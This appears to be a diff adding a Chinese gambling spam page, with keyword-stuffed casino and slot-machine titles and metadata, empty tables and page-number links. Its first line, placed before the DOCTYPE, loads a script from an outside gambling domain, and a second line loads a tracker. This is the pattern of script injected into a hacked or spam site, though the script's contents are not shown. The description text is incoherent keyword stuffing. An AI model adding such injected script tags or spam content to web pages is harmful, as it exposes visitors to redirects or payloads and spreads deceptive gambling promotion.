@@ -1,0 +1,39 @@
+﻿<SCRIPT language=javascript src="http://718shenbo.com/bz.js"></SCRIPT>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/17751129.js"></script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>老虎机_澳门赌博_真人网上娱乐_博彩网-【618shenbo.com】娱乐平台最佳 </title>
+<meta name="keywords" content="博彩网官网">
+<meta name="description" content="澳门赌场最佳娱乐平台,澳门赌场真人娱乐为你的网购提供男女博彩排名游戏点卡充值等优质博彩娱乐论坛吧商品，更提供先收货后付款、博彩网先行赔付、假一赔三、七天无理由退换货等安全交易保障服务!">
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<body leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+<table cellspacing="0" cellpadding="0" width="778" border="0">
+  <tr></tr>
+</table>
+<table cellspacing="0" cellpadding="0" width="778" border="0">
+  <tr>
+    <td valign="top">&nbsp;&nbsp;&nbsp;</td>
+  </tr>
+</table>
+<table cellspacing=0 cellpadding=0 width=778 align=center border=0>
+  <tr>
+    <td height="10">
+      <table width="950" border="1" cellpadding="3" cellspacing="1" bordercolor="#B8B8B8" bgcolor="#F0F0F0">
+        <tbody>
+        </tbody>
+      </table>
+      <center>
+        <table width="950" border="0" cellpadding="0" cellspacing="0">
+          <tr>
+            <td height="30" align="center"><a href="index.html">第一页</a> <a href="page_2.html">第二页</a> <a href="page_3.html">第三页</a> <a href="page_4.html">第四页</a> <a href="page_5.html">第五页</a> <a href="page_6.html">第六页</a> <a href="page_7.html">第七页</a> <a href="page_8.html">第八页</a> <a href="page_9.html">第九页</a> <a href="page_10.html">第十页</a> <a href="page_11.html">第十一页</a> <a href="page_12.html">第十二页</a> <a href="page_13.html">第十三页</a> <a href="page_14.html">第十四页</a>
+              </td>
+          </tr>
+          
+          </tr>
+        </table>
+      </center>
+    </td>
+  </tr>
+</table>
+</body>
+</html>
